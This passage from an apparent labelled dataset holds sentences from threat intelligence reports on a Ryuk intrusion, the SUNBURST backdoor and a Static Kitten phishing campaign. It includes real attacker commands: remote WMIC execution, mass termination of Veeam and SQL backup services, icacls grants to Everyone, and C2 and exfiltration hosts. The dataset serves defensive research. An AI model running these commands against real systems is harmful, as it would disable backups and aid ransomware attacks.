        "text": "WMIC /node:\\\"DC.example.domain\\\" process call create \\\"rundll32 C:\\\\PerfLogs\\\\arti64.dll, StartW\\\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S51",
        "text": "This payload did not appear to run successfully, as shortly after the threat actors dropped an additional payload on the beachhead host, and then executed a service on the DC, after no command and control traffic was apparent.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S52",
        "text": "Following this, the treat actors copied and executed a Cobalt Strike beacon executable and initiated it via a service on the domain controller.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S53",
        "text": "At this point, C2 connections appear on the domain controller connecting to martahzz[.]com \u2013 88.119.171[.]75 over 443/https.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S54",
        "text": "Backup systems were targeted for lateral movement using the SMB exe executed around one hour after the first lateral movement execution from the beachhead host.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S55",
        "text": "The threat actor was having issues running beacons on numerous systems, and on at least one of the systems, they mounted the drive remotely.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S56",
        "text": "C:\\Windows\\system32\\cmd.exe /C dir \\\\Server\\c$",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S57",
        "text": "Domain discovery (AdFind and Rubeus outputs) exfiltrated by vsftpd to 45.141.84[.]120.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S58",
        "text": "SMB was used to transfer the Ryuk executables.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S59",
        "text": "Then, RDP connections were made from the first compromised DC, and then, ransomware executed throughout the environment, starting with the Backup servers.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S60",
        "text": "On the backup server, prior to execution, the threat actors pulled up the wbadmin msc console.\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S61",
        "text": "Commands ran prior to ransom execution:",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S62",
        "text": "- \"C:\\Windows\\system32\\net1 stop \\\"\"samss\\\"\" /y\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S63",
        "text": "- \"C:\\Windows\\system32\\net1 stop \\\"\"veeamcatalogsvc\\\"\" /y\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S64",
        "text": "- \"C:\\Windows\\system32\\net1 stop \\\"\"veeamcloudsvc\\\"\" /y\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S65",
        "text": "- \"C:\\Windows\\system32\\net1 stop \\\"\"veeamdeploysvc\\\"\" /y\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S66",
        "text": "- \"C:\\Windows\\System32\\net.exe\\\"\" stop \\\"\"samss\\\"\" /y\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S67",
        "text": "- \"C:\\Windows\\System32\\net.exe\\\"\" stop \\\"\"veeamcatalogsvc\\\"\" /y\"\n",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S68",
        "text": "- \"C:\\Windows\\System32\\net.exe\\\"\" stop \\\"\"veeamcloudsvc\\\"\" /y\"\n",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S69",
        "text": "- \"C:\\Windows\\System32\\net.exe\\\"\" stop \\\"\"veeamdeploysvc\\\"\" /y\"\n",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S70",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM sqlbrowser.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S71",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM sqlceip.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S72",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM sqlservr.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S73",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM sqlwriter.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S74",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.agent.configurationservice.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S75",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.brokerservice.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S76",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.catalogdataservice.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S77",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.cloudservice.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S78",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.externalinfrastructure.dbprovider.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S79",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.manager.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S80",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.mountservice.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S81",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.service.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S82",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.uiserver.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S83",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.wmiserver.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S84",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeamdeploymentsvc.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S85",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeamfilesysvsssvc.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S86",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.guest.interaction.proxy.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S87",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeamnfssvc.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S88",
        "text": "- \"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeamtransportsvc.exe /F\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S89",
        "text": "- \"C:\\Windows\\system32\\taskmgr.exe\\\"\" /4\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S90",
        "text": "- \"C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S91",
        "text": "- \"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S92",
        "text": "- \"icacls \\\"\"C:\\*\\\"\" /grant Everyone:F /T /C /Q\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S93",
        "text": "- \"icacls \\\"\"D:\\*\\\"\" /grant Everyone:F /T /C /Q\"",
        "type": "COMMAND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S94",
        "text": "All systems were left with the following ransom note:\n",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-62.md:::S95",
        "text": "The threat actors asked for more than $6 million but were willing to negotiate.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S0",
        "text": "FireEye has uncovered a widespread campaign, that we are tracking as UNC2452.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S1",
        "text": "The actors behind this campaign gained access to numerous public and private organizations around the world.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S2",
        "text": "They gained access to victims via trojanized updates to SolarWind\u2019s Orion IT monitoring and management software.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S3",
        "text": "This campaign may have begun as early as Spring 2020 and is currently ongoing.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S4",
        "text": "Post compromise activity following this supply chain compromise has included lateral movement and data theft.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S5",
        "text": "The campaign is the work of a highly skilled actor and the operation was conducted with significant operational security.",
        "type": "IRRELEVANT"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S6",
        "text": "SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S7",
        "text": "We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST.\n",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S8",
        "text": "After an initial dormant period of up to two weeks, it retrieves and executes commands, called \u201cJobs\u201d, that include the ability to transfer files, execute files, profile the system, reboot the machine, and disable system services.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S9",
        "text": "The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S10",
        "text": "The backdoor uses multiple obfuscated blocklists to identify forensic and anti-virus tools running as processes, services, and drivers.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S11",
        "text": "Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.msp",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S12",
        "text": "The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S13",
        "text": "Once the update is installed, the malicious DLL will be loaded by the legitimate SolarWinds.BusinessLayerHost.exe or SolarWinds.BusinessLayerHostx64.exe (depending on system configuration).",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S14",
        "text": "After a dormant period of up to two weeks, the malware will attempt to resolve a subdomain of avsvmcloud[.]com.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S15",
        "text": "The DNS response will return a CNAME record that points to a Command and Control (C2) domain.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S16",
        "text": "The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S17",
        "text": "The list of known malicious infrastructure is available on FireEye\u2019s GitHub page.",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S18",
        "text": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S19",
        "text": "After an initial dormant period of up to two weeks, it retrieves and executes commands, called \u201cJobs\u201d, that include the ability to transfer and execute files, profile the system, and disable system services.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S20",
        "text": "The backdoor\u2019s behavior and network protocol blend in with legitimate SolarWinds activity, such as by masquerading as the Orion Improvement Program (OIP) protocol and storing reconnaissance results within plugin configuration files.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S21",
        "text": "The backdoor uses multiple blocklists to identify forensic and anti-virus tools via processes, services, and drivers.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S22",
        "text": "- Subdomain DomainName Generation Algorithm (DGA) is performed to vary DNS requests CNAME responses point to the C2 domain for the malware to connect to The IP block of A record responses controls malware behavior DGA encoded machine domain name, used to selectively target victims\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S23",
        "text": "- Command and control traffic masquerades as the legitimate Orion Improvement Program",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S24",
        "text": "- Code hides in plain site by using fake variable names and tying into legitimate components\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S25",
        "text": "Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds\u2019s website.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S26",
        "text": "The update package CORE-2019.4.5220.20574-SolarWinds-Core-v2019.4.5220-Hotfix5.msp (02af7cec58b9a5da1c542b5a32151ba1) contains the SolarWinds.Orion.Core.BusinessLayer.dll described in this report.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S27",
        "text": "After installation, the Orion software framework executes the .NET program SolarWinds.BusinessLayerHost.exe to load plugins, including SolarWinds.Orion.Core.BusinessLayer.dll.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S28",
        "text": "This plugin contains many legitimate namespaces, classes, and routines that implement functionality within the Orion framework.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S29",
        "text": "Hidden in plain sight, the class SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer implements an HTTP-based backdoor.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S30",
        "text": "Code within the logically unrelated routine SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInternal invokes the backdoor code when the Inventory Manager plugin is loaded.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S31",
        "text": "SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds, using the certificate with serial number 0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S32",
        "text": "The file was signed on March 24, 2020.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S33",
        "text": "On execution of the malicious SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer.Initialize method the sample verifies that its lower case process name hashes to the value 17291806236368054941.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S34",
        "text": "This hash value is calculated as the standard FNV-1A 64-bit hash with an additional XOR by 6605813339339102567 after computing the FNV-1A. This hash matches a process named \"solarwinds.businesslayerhost\".\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S35",
        "text": "The sample only executes if the filesystem write time of the assembly is at least 12 to 14 days prior to the current time; the exact threshold is selected randomly from an interval.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S36",
        "text": "The sample continues to check this time threshold as it is run by a legitimate recurring background task.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S37",
        "text": "Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as a guard that only one instance is running before reading SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and retrieving the XML field appSettings.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S38",
        "text": "The appSettings fields\u2019 keys are legitimate values that the malicious logic re-purposes as a persistent configuration.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S39",
        "text": "The key ReportWatcherRetry must be any value other than 3 for the sample to continue execution.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S40",
        "text": "The sample checks that the machine is domain joined and retrieves the domain name before execution continues.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S41",
        "text": "A userID is generated by computing the MD5 of a network interface MAC address that is up and not a loopback device, the domain name, and the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S42",
        "text": "The userID is encoded via a custom XOR scheme after the MD5 is calculated.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S43",
        "text": "The ReportWatcherPostpone key of appSettings is then read from SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the initial, legitimate value.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S44",
        "text": "This operation is performed as the sample later bit packs flags into this field and the initial value must be known in order to read out the bit flags.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S45",
        "text": "The sample then invokes the method Update which is the core event loop of the sample.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S46",
        "text": "The backdoor determines its C2 server using a Domain Generation Algorithm (DGA) to construct and resolve a subdomain of avsvmcloud[.]com.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S47",
        "text": "The Update method is responsible for initializing cryptographic helpers for the generation of these random C2 subdomains.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S48",
        "text": "Subdomains are generated by concatenating a victim userId with a reversible encoding of the victims local machine domain name.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S49",
        "text": "The attacker likely utilizes the DGA subdomain to vary the DNS response to victims as a means to control the targeting of the malware.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S50",
        "text": "These subdomains are concatenated with one of the following to create the hostname to resolve:\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S51",
        "text": "- .appsync-api.eu-west-1[.]avsvmcloud[.]com",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S52",
        "text": "- .appsync-api.us-west-2[.]avsvmcloud[.]com",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S53",
        "text": "- .appsync-api.us-east-1[.]avsvmcloud[.]com",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S54",
        "text": "- .appsync-api.us-east-2[.]avsvmcloud[.]com",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S55",
        "text": "Process name, service name, and driver path listings are obtained, and each value is hashed via the FNV-1a + XOR algorithm as described previously and checked against hardcoded blocklists.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S56",
        "text": "Some of these hashes have been brute force reversed as part of this analysis, showing that these routines are scanning for analysis tools and antivirus engine components.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S57",
        "text": "If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S58",
        "text": "Blocklisted services are stopped by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\<service_name>\\Start registry entries to value 4 for disabled.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S59",
        "text": "Some entries in the service list if found on the system may affect the DGA algorithms behavior in terms of the values generated.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S60",
        "text": "The list of stopped services is then bit-packed into the ReportWatcherPostpone key of the appSettings entry for the samples\u2019 config file.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S61",
        "text": "If any service was transitioned to disabled the Update method exits and retries later.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S62",
        "text": "The sample retrieves a driver listing via the WMI query Select * From Win32_SystemDriver.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S63",
        "text": "If any blocklisted driver is seen the Update method exits and retries.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S64",
        "text": "If all blocklist tests pass, the sample tries to resolve api.solarwinds.com to test the network for connectivity.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S65",
        "text": "If all blocklist and connectivity checks pass, the sample starts generating domains in a while loop via its DGA.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S66",
        "text": "The sample will delay for random intervals between the generation of domains; this interval may be any random value from the ranges 1 to 3 minutes, 30 to 120 minutes, or on error conditions up to 420 to 540 minutes (9 hours).",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S67",
        "text": "The DNS",
        "type": "Relevant-HEADER"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S68",
        "text": "A record of generated domains is checked against a hardcoded list of IP address blocks which control the malware\u2019s behavior.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S69",
        "text": "Records within the following ranges will terminate the malware and update the configuration key ReportWatcherRetry to a value that prevents further execution:\n",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S70",
        "text": "- 10.0.0.0/8\n",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S71",
        "text": "- 172.16.0.0/12\n",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S72",
        "text": "- 192.168.0.0/16",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S73",
        "text": "- 224.0.0.0/3\n",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S74",
        "text": "- fc00:: - fe00::\n",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S75",
        "text": "- fec0:: - ffc0::\n",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S76",
        "text": "- ff00:: - ff00::",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S77",
        "text": "- 20.140.0.0/15\n",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S78",
        "text": "- 96.31.172.0/24\n",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S79",
        "text": "- 131.228.12.0/22\n",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S80",
        "text": "- 144.86.226.0/24\n",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S81",
        "text": "Once a domain has been successfully retrieved in a CNAME DNS response the sample will spawn a new thread of execution invoking the method HttpHelper.Initialize which is responsible for all C2 communications and dispatching.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S82",
        "text": "The HTTP thread begins by delaying for a configurable amount of time that is controlled by the SetTime command.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S83",
        "text": "The HTTP thread will delay for a minimum of 1 minute between callouts.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S84",
        "text": "The malware uses HTTP GET or HTTP POST requests.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S85",
        "text": "If the sample is attempting to send outbound data the content-type HTTP header will be set to \"application/octet-stream\" otherwise to \"application/json\".",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S86",
        "text": "A JSON payload is present for all HTTP POST and PUT requests and contains the keys \u201cuserId\u201d, \u201csessionId\u201d, and \u201csteps\u201d.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S87",
        "text": "The \u201csteps\u201d field contains a list of objects with the following keys: \u201cTimestamp\u201d, \u201cIndex\u201d, \u201cEventType\u201d, \u201cEventName\u201d, \u201cDurationMs\u201d, \u201cSucceeded\u201d, and \u201cMessage\u201d.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S88",
        "text": "The JSON key \u201cEventType\u201d is hardcoded to the value \u201cOrion\u201d, and the \u201cEventName\u201d is hardcoded to \u201cEventManager\u201d.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S89",
        "text": "Malware response messages to send to the server are DEFLATE compressed and single-byte-XOR encoded, then split among the \u201cMessage\u201d fields in the \u201csteps\u201d array.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S90",
        "text": "Each \u201cMessage\u201d value is Base64 encoded separately.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S91",
        "text": "Not all objects in the \u201csteps\u201d array contribute to the malware message \u2013 the integer in the \u201cTimestamp\u201d field must have the 0x2 bit set to indicate that the contents of the \u201cMessage\u201d field are used in the malware message.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S92",
        "text": "Step objects whose bit 0x2 is clear in the Timestamp field contain random data and are discarded when assembling the malware response.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S93",
        "text": "In observed traffic these HTTP response bodies attempt to appear like benign XML related to .NET assemblies, but command data is actually spread across the many GUID and HEX strings present.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S94",
        "text": "Commands are extracted from HTTP response bodies by searching for HEX strings using the following regular expression: \"\\{[0-9a-f-]{36}\\}\"|\"[0-9a-f]{32}\"|\"[0-9a-f]{16}\".",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S95",
        "text": "Command data is spread across multiple strings that are disguised as GUID and HEX strings.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S96",
        "text": "All matched substrings in the response are filtered for non HEX characters, joined together, and HEX-decoded.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S97",
        "text": "The first DWORD value shows the actual size of the message, followed immediately with the message, with optional additional junk bytes following.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S98",
        "text": "The extracted message is single-byte XOR decoded using the first byte of the message, and this is then DEFLATE decompressed.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S99",
        "text": "The first character is an ASCII integer that maps to the JobEngine enum, with optional additional command arguments delimited by space characters.",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-68.md:::S100",
        "text": "Commands are then dispatched to a JobExecutionEngine based upon the command value as described next.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S0",
        "text": "We identified two lure ZIP files being used by Static Kitten designed to trick users into downloading a purported report on relations between Arab countries and Israel, or a file relating to scholarships.",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S1",
        "text": "The URLs distributed through these phishing emails direct recipients to the intended file storage location on Onehub, a legitimate service known to be used by Static Kitten for nefarious purposes.[6]",
        "type": "ACTION"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S2",
        "text": "Anomali Threat Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.\n",
        "type": "Relevant-BACKGROUND"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S3",
        "text": "The delivery URLs found to be part of this campaign are:\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S4",
        "text": "- ws.onehub[.]com/files/7w1372el",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S5",
        "text": "- ws.onehub[.]com/files/94otjyvd",
        "type": "URL"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S6",
        "text": "File names in this campaign include:",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S7",
        "text": "- Analysis and study of the normalization of relations between the Arab countries and Israel httpsmod.gov.kw.zip\n",
        "type": "Relevant-PROPERTY"
    },
    {
        "id": "cti_reports_filtered/r-78.md:::S8",
        "text": "- Analysis and study of the normalization of relations between the Arab countries and Israel httpsmod.gov.kw.exe\n",
        "type": "Relevant-PROPERTY"
    },
    {
